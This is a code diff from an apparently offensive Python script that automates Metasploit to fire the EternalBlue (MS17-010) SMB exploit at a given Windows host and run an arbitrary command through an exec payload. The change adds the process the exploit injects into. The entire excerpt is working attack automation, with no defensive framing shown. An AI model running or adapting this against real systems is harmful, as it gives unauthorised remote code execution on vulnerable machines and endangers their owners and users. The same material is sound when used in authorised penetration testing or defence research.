@@ -19,6 +19,7 @@ def run(client, RHOST, CMD):
     # console.write is copy-&-paste friendly; copy from Armitage/msfconsole successful run
     console.write('use exploit/windows/smb/ms17_010_eternalblue')
     console.write('set MaxExploitAttempts 1')
+    console.write('set Process smss.exe')
     console.write('set RHOST {0}'.format(RHOST))
     console.write('set PAYLOAD windows/x64/exec')
     console.write('set CMD {0}'.format(CMD))
